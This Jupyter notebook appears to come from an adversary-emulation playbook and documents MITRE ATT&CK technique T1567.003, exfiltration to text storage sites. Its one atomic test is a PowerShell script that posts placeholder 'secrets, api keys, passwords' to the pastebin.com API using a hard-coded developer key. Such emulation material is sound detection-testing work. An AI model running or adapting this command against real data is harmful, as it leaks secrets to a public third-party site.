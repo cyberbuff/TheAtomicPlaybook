{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1cc9452a",
   "metadata": {},
   "source": "# T1567.003 - Exfiltration to Text Storage Sites\nAdversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)\n\n**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs."
  },
  {
   "cell_type": "markdown",
   "id": "8bcd7e5e",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "d8d8aba8",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)",
    "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$apiKey = \"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25b1d1b0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1567.003 -TestNumbers 1"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}